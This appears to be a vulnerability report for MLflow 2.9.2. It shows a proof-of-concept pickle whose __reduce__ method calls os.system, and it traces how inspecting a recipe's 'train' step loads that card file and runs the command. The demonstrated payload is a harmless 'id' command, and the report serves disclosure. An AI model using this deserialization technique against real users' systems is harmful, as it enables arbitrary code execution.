v2.9.2
PoC：

```python
import pickle
import os
class test():
    def __reduce__(self):
        command=r"id >/tmp/mlflow"
        return (os.system,(command,))

with open('./card.pkl', 'wb') as f:
   pickle.dump(test(), f)
   

from mlflow.recipes import Recipe

os.environ['MLFLOW_RECIPES_EXECUTION_DIRECTORY']='/mlflow/recipes/'
os.chdir("./recipes")
regression_recipe = Recipe(profile="local")
# Inspect the model training results
regression_recipe.inspect(step="train")
```

Process

1. When inspecting the "train" step, it triggers the following execution flow:

```python
def inspect(self, step: str = None) -> None:
# ...if not step:
            display_html(html_file_path=self._get_recipe_dag_file())
        else:
            output_directory = get_step_output_path(self._recipe_root_path, step, "")
            self._get_step(step).inspect(output_directory)

```

1. Get the step(train) output path:

```python
def get_step_output_path(recipe_root_path: str, step_name: str, relative_path: str) -> str:
#...
    execution_dir_path = get_or_create_base_execution_directory(recipe_root_path=recipe_root_path)
    step_outputs_path = _get_step_output_directory_path(
        execution_directory_path=execution_dir_path,
        step_name=step_name,
    )
    return os.path.abspath(os.path.join(step_outputs_path, relative_path))

```

1.  Load the card_pickle:

```python
def inspect(self, output_directory: str):
#...
        card_path = os.path.join(output_directory, CARD_PICKLE_NAME)
        if not os.path.exists(card_path):
#...

        card = BaseCard.load(card_path)#<---Here is the issue!#...
```

When a user loads a recipe card model that in the internet and inspects the model training results, it might result in a code execution.
